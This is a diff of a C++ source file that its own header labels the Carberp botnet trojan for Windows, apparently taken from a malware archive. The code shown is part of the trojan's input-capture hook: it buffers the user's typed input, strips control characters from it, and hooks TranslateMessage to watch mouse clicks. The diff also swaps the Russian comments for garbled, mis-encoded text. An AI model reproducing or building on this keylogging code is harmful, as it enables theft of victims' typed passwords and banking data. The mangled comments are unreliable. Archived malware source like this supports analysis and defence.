@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <ws2tcpip.h>
@@ -25,15 +36,15 @@ static LPWSTR userInputBuffer;
 static WORD userInputBufferSize;
 
 /*
-  Добавление строки в буффер ввода.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN string - строка для добавления.
+  IN string - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void addString(const LPWSTR string)
 {
   int stringSize = Str::_LengthW(string);
   
-  //Если строка слишком длинная, эти данные нас врятли интересуют. Поэтому сбрасываем буфер.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   if(stringSize > USERINPUT_MAX_CHARS)UserHook::clearInput();
   else
   {
@@ -120,7 +131,7 @@ DWORD UserHook::getInput(LPWSTR *buffer)
       *buffer = p;
       retVal = userInputBufferSize;
       
-      //Убираем служебные символы.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       for(DWORD i = 0; i < userInputBufferSize; i++)if(p[i] < 0x20)p[i] = 0x20;
     }
   }
@@ -130,7 +141,7 @@ DWORD UserHook::getInput(LPWSTR *buffer)
 
 BOOL WINAPI UserHook::hookerTranslateMessage(const MSG *msg)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Тормаза дает.
+  //WDEBUG0(WDDT_INFO, "Called"); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   if(msg != NULL && Core::isActive())
   {
     if(msg->message == WM_LBUTTONDOWN)
